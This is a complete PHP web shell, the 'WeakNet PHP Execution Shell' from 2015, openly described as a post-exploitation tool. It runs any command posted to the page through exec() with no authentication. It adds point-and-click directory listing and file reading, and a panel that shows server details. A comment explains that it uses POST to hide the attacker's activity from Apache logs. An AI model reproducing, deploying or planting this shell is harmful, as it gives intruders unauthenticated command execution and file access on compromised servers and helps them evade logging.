<!DOCTYPE html>
<html>
<!--
	WeakNet PHP Execution Shell - Post-exploitation shell for convenience
	with navigation, and file content showing capabilities

	2015 - Written by Douglas WeakNetLabs@Gmail.com
-->
<head>
<title>Weakerthan PHP Exec Shell - 2015 WeakNet Labs</title>
<style>
	html{ /* global styling */
		font-family:"Open Sans", sans-serif;
		background-color:#3c3c3c;
		color:#729fcf;
	}
	.inputCMD{ /* input parent box at the bottom */
		border-top:3px solid #666;
		position:fixed;
		bottom:0px;
		left:0px;
		width:100%;
		padding:20px 0px 20px 10px;
		background:#262626;
	}
	.cmdTitle{ /* a simple span to differentiate the command from the title */
		font-size:14px;
		color:yellow;
		font-family:monospace;
	}
	input[type=text]{ /* making input look a bit more modern */
		font-size:15px;
		background-color:#545454;
		color:yellow;
		padding:10px;
		border:2px solid #2e2e2e;
		float:left;
	}
	.titleBar{ /* this parent div is positioned */
		position:fixed; 
		top:0px;
		left:0px;
		width:100%;
		height:50px;
		background:#2a2a2a;
		border-bottom:3px solid #666;
		padding-bottom:5px;
	}
	.title{ /* this div is to vertically center the child, titleCenter */
		display: table-cell;
		vertical-align: middle;
		padding:10px 0px 10px 10px;
	}
	.titleCenter{ /* vertically centered in middle of ".title" */
		height:25px;
		margin:auto;
		display: inline-block;
	}
	.output{ /* command output box with scolled overlfow */
		font-family: monospace;
		font-size:14px;
		margin:70px 0px 0px 0px;
		overflow:scrolled;
		padding: 5px 0px 150px 5px; /* to show command output behind the inputCMD bar */
		color:#ccc;
		background-color:#565656;
	}
	.unicode{ /* display a pointer on hover */
		cursor:pointer;
	}
	.serverInfo{ /* for small box on top right for server information */
		border:2px solid #666;
		position:fixed;
		top:10px;
		right:10px;
		z-index:1337;
		background:#2e2e2e;
		color:#729fcf;
		padding:5px;
		font-size:14px;
	}
	.branding{ /* for a link to the GitHUB page */
		float:right;
		font-size:15px;
		margin-right:20px;
	}
	a{ /* why can't this be non hideous by default? */
		text-decoration:none;
		color:#729fcf;
	}
	/* these are for styling the tbale output of the .serverInfo box: */
	tr:nth-child(even) {background: #202020}
	tr:nth-child(odd) {background: #343434}
	td{ padding:3px;}
</style>
<script>
	// for dynamically generating navigation from output
	function submitFile(path,file,action){
		if(action == "cat"){
			document.getElementById("inputCmd").value='cat ' + path + file; // TODO change to while read foo do echo foo
		}else if(action == "ls"){
			document.getElementById("inputCmd").value='ls -l ' + path + file; // TODO change to while read foo do echo foo
		}
		document.getElementById("submitCmd").submit(); // submit the request
	}
</script>
</head>
<body>
<?php
	$cmd = $_POST['cmd']; # reassign is easier to read
	if ($cmd == "") { # initial hit to the page
		$cmd = "(none) Please type a command to execute below";
	}else{
		exec("$cmd", $results); # a command, let's execute it on the host
		echo "<div class=\"titleBar\"><div class=\"title\"><div class=\"titleCenter\"><span style=\"font-size:35px;\">&#128026;</span> Results for command: ".
			" <span class=\"cmdTitle\">".$cmd."</span></div></div></div>";
	}
?>
<div class="output">
<?php
	foreach(array_slice($results,1,count($results)) as $output) { # let's format the output, in case it contains HTML characters:
		$exploded = explode(" ", $output);
		$file = array_pop($exploded);
		$path = preg_replace("/.*\s([^ ]+)$/","$1","$cmd"); # get full path
		if(!preg_match("/\/$/","$path")){ # add a fwd slash:
			$path .= "/";
		} # now we can style the regular file output:
		$output = preg_replace("/&/","&amp;",$output); # replace all ampersands
		$output = preg_replace("/</","&lt;",$output); # replace all less thanh (open HTML tag brackets)
		$output = preg_replace("/\s/","&nbsp;",$output); # replace all whitespace
		if(preg_match("/^ls -l\s/","$cmd")){ # is this an ls command?
			if(!preg_match("/^d/","$output")){
				echo "<span style=\"color:yellow\" title=\"Click here view file contents\" class=\"unicode\" onClick=\"submitFile('$path','$file','cat');\">&#128049;</span>&nbsp;".$output."<br />";
			}else{
    				echo "<span style=\"color:#00ce05\" title=\"Click here to view directory contents\" class=\"unicode\" onClick=\"submitFile('$path','$file','ls');\">&#128269;</span>&nbsp;".$output."<br />";
			}
		}else{
    			echo $output."<br />";
		}
	}
?>
</div>
<div class="inputCMD">
	<form action="#" method="post" name="submitCmd" id="submitCmd"><!-- no button here, just hit enter -->
		<input id="inputCmd" type="text" size="55" placeholder="Type command here to execute on host and hit return" name="cmd"/>
	</form><!-- went with POST method to slightly obfuscate the attacker's activity from simple Apache logs -->
<div class="branding">
	<a href="https://github.com/weaknetlabs/wpes">&#128026; WPES WeakNet Labs</a>
</div>
<div class="serverInfo">
	<table>
		<tr><strong style="font-size:16px;">Remote Server Information</strong></tr>
		<tr><td>&#128225;</td><td>IP</td><td><?php echo $_SERVER['SERVER_ADDR'] ?></td</tr>
		<tr><td>&#128225;</td><td>Hostname</td><td><?php echo $_SERVER['SERVER_NAME']; ?></td</tr>
		<tr><td>&#128225;</td><td>Software</td><td><?php echo $_SERVER['SERVER_SOFTWARE']; ?></td</tr>
		<tr><td>&#128225;</td><td>Timestamp</td><td><?php echo $_SERVER['REQUEST_TIME']; ?></td</tr>
		<tr><td>&#128225;</td><td>Admin</td><td><?php echo $_SERVER['SERVER_ADMIN']; ?></td</tr>
	</table>
</div>
</body>
</html>
